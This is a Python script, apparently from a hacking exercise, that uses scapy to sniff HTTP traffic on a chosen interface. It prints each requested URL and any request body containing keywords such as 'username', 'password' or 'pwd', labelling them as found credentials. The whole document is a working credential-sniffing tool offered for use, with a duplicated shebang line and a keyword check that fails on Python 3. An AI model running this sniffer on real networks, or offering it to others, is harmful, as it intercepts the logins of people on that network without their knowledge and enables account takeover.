#!/usr/bin/#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
import argparse

# Create function to pass arguments while calling the program
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Set Interface")
    options = parser.parse_args()
    if not options.interface:
        parser.error("[-] Please specify an interface using -i or --interface options, use --help for more info.")
    return options

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packets, filter="tcp")

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_user_credentials(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "password", "login", "user", "pass", "pwd", "passwd"]
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTPRequest >> " + url)

        user_credentials = get_user_credentials(packet)

        if user_credentials:
            print("\n[+] Found username/password > " + user_credentials + "\n")


options = get_arguments()
sniff(options.interface)
